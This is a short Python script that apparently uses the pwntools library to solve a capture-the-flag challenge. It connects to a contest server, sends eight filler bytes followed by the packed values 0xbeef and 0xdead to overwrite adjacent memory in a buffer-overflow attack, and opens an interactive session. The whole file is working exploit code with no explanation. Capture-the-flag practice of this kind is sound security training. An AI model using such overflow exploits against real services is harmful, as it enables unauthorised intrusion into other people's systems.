from pwn import *

r = remote("csie.ctf.tw", 10125)
context.arch = "amd64"

r.recv()
payload = "a" * 8 + p32(0xbeef) + p32(0xdead)
r.send(payload)
r.interactive()
